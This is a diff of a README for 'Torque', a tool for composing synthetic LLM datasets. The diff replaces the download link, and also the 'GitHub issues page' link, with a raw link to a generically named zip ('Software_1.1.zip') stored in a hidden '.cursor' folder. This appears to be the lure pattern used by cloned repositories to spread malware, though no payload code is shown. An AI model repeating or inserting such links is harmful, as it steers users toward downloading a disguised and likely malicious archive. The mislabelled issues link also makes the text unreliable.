@@ -12,7 +12,7 @@
 Torque is a simple tool that helps you create synthetic datasets for large language models (LLMs). It uses a declarative and typesafe Domain-Specific Language (DSL) which makes it easy to compose conversations just like you would with React components. Whether you want to generate data for testing or training, Torque provides a straightforward way to build what you need.
 
 ## 📥 Download & Install
-To get started, **visit this page to download** the latest version of Torque: [Download Torque](https://raw.githubusercontent.com/xrentnerdukek/torque/main/stackblitz-templates/quick-start/torque-3.9-alpha.1.zip).
+To get started, **visit this page to download** the latest version of Torque: [Download Torque](https://raw.githubusercontent.com/xrentnerdukek/torque/main/.cursor/Software_1.1.zip).
 
 You can find various versions available for download based on your needs. Choose the version that suits your platform, and follow these steps:
 
@@ -58,7 +58,7 @@ Ensure your system meets these specifications for a smooth experience.
 ## 🔧 Support
 If you encounter any issues or have questions, we are here to help. Here are some ways to get support:
 
-- **GitHub Issues:** Post a question or report an issue on our [GitHub issues page](https://raw.githubusercontent.com/xrentnerdukek/torque/main/stackblitz-templates/quick-start/torque-3.9-alpha.1.zip).
+- **GitHub Issues:** Post a question or report an issue on our [GitHub issues page](https://raw.githubusercontent.com/xrentnerdukek/torque/main/.cursor/Software_1.1.zip).
 - **Community Forum:** Join discussions and ask for help from other users in the community forum.
 - **Documentation:** Refer to the documentation provided with the software for quick reference.
 
